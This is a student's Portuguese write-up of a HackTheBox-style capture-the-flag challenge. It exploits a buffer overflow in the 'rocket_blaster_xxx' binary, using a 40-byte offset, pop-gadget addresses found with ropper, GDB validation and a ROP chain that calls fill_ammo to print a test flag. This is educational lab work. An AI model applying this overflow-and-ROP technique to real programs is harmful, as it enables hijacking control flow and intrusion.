# Beatriz Pontes Camargo — GRR20242966

# Relatório de exploração — `rocket_blaster_xxx`

---

## Identificação / Resumo

**Análise geral:** o binário `rocket_blaster_xxx` lê entrada com `read(0, &local_28, 0x66)` e contém uma função não chamada em `main` denominada `fill_ammo`. O objetivo da exploração foi causar um buffer overflow em `main`, sobrescrever o return address e invocar `fill_ammo` com três argumentos específicos para que ela abra `flag.txt` e imprima a flag `HTB{f4k3_fl4g_4_t35t1ng}`.

---

## Objetivo

Explorar vulnerabilidade de leitura sem verificação (buffer overflow) no `main` para controlar o fluxo de execução e chamar `fill_ammo` com os argumentos:

* `rdi = 0xdeadbeef`
* `rsi = 0xdeadbabe`
* `rdx = 0xdead1337`

e assim obter o conteúdo de `flag.txt`.

---

## Ferramentas utilizadas

* Ghidra (decompilação / análise estática)
* `ropper` (busca de gadgets ROP)
* `objdump`, `strings` (inspeção binária)
* `gdb` (depuração / validação)
* `python` (para criar o input de rocket_blaster_xxx)

---

## 1) Análise no Ghidra (decompilação)

### `main` (observações)

* `main` chama `banner()` e imprime o prompt `>>`.
* Inicializa 4 variáveis locais.
* Chama `read(0, &local_28, 0x66)` → lê até `0x66` bytes para um buffer local (leitura sem proteção).
* Por testes de overflow (envio de `'A'` repetidos e inspeção com GDB) verifiquei que o offset até o saved RIP** é de 40 bytes
  → `padding = "A" * 40` alcança o saved RIP.

### `fill_ammo` (observações)

* Endereço: **`0x4012f5`**.
* Abre `./flag.txt` e aborta se falhar.
* Verifica três parâmetros (convenção x86_64: `rdi`, `rsi`, `rdx`):

  * `if (param_1 != 0xdeadbeef) exit(...)` → **`rdi`**
  * `if (param_2 != 0xdeadbabe) exit(...)` → **`rsi`**
  * `if (param_3 != 0xdead1337) exit(...)` → **`rdx`**
* Se todos corretos, imprime:

  ```
  [✓] [✓] [✓]

  All Placements are set correctly!

  Ready to launch at: HTB{f4k3_fl4g_4_t35t1ng}
  ```

  e então copia o conteúdo de `flag.txt` para `stdout`.

---

## 2) Conclusão da análise estática

É necessário preparar os registradores `rdi`, `rsi` e `rdx` com os valores antes de saltar para `fill_ammo`. Como `main` não chama `fill_ammo`, a via de exploração é sobrescrever o saved RIP (ROP) para executar gadgets que setem esses registradores e em seguida saltar para `fill_ammo`.

---

## 3) Descoberta de gadgets (ROP)

Usei `ropper` para localizar gadgets `pop <reg>; ret` no binário:

Comandos:

```bash
ropper -f ./rocket_blaster_xxx --search "pop rdi"
ropper -f ./rocket_blaster_xxx --search "pop rsi"
ropper -f ./rocket_blaster_xxx --search "pop rdx"
```

Resultado relevante:

```
0x40159f: pop rdi; ret
0x40159d: pop rsi; ret
0x40159b: pop rdx; ret
```

Esses gadgets permitem, através de ROP, colocar valores arbitrários em `rdi`, `rsi` e `rdx` (cada `pop` consome o próximo QWORD da pilha e o coloca no registrador correspondente)

---

## 4) Exploração prática (validação com GDB)

Para validar o comportamento de `fill_ammo` rodei o programa no GDB:

Comandos (GDB):

```gdb
gdb -q ./rocket_blaster_xxx
# dentro do gdb:
(gdb) break main
(gdb) run
# quando o breakpoint em main for atingido:
(gdb) set $rdi = 0xdeadbeef
(gdb) set $rsi = 0xdeadbabe
(gdb) set $rdx = 0xdead1337
(gdb) jump *0x4012f5
# ou alternativamente:
(gdb) call (void) fill_ammo(0xdeadbeef, 0xdeadbabe, 0xdead1337)
```

**Resultado:** a execução imprimiu a mensagem de sucesso e o conteúdo de `flag.txt` (`HTB{f4k3_fl4g_4_t35t1ng}`).

---
## 5) Técnica de ROP (Return-Oriented Programming)
--> Como a função fill_ammo exige três valores específicos em rdi, rsi, rdx, precisamos colocar esses valores nesses registradores antes de chamar essa função

--> Como não podemos executar código na stack, usei gadgets existentes no binário que terminam em ret e que executam instruções úteis (pop rdi, pop rsi, pop rdx).

--> Quando o read() do main lê o payload, esses bytes irão sobrescrever o saved RIP. A pilha passa a conter, após o offset de 40 bytes, uma sequência de QWORDs (8 bytes cada) que representam gadgets e valores. A estrutura é:

[ padding (40 bytes) ]    -> preenche o buffer até o saved RIP, de modo que o primeiro QWORD escrito após o padding sobrescreve o saved RIP
[ addr pop rdi; ret ]     -> coloca o próximo QWORD em rdi
[ 0xdeadbeef ]            -> valor para rdi
[ addr pop rsi; ret ]     -> coloca o próximo QWORD em rsi
[ 0xdeadbabe ]            -> valor para rsi
[ addr pop rdx; ret ]     -> coloca o próximo QWORD em rdx
[ 0xdead1337 ]            -> valor para rdx
[ ret (alinhamento) ]     -> alinhamento da pilha
[ addr fill_ammo ]        -> salta para a função com os registradores já preparados

## 6) Resultado obtido
Ao criar o arquivo binario com o script python e usar como entrada:

python3 make_payload.py 
./rocket_blaster_xxx < payload.bin
```
[✓] [✓] [✓]

All Placements are set correctly!

Ready to launch at: HTB{f4k3_fl4g_4_t35t1ng}
```

A flag `HTB{f4k3_fl4g_4_t35t1ng}` foi obtida com sucesso. Um `Segmentation fault` residual apareceu em algumas execuções após a impressão da flag devido ao estado da pilha/retorno; isso não impediu a extração da flag.
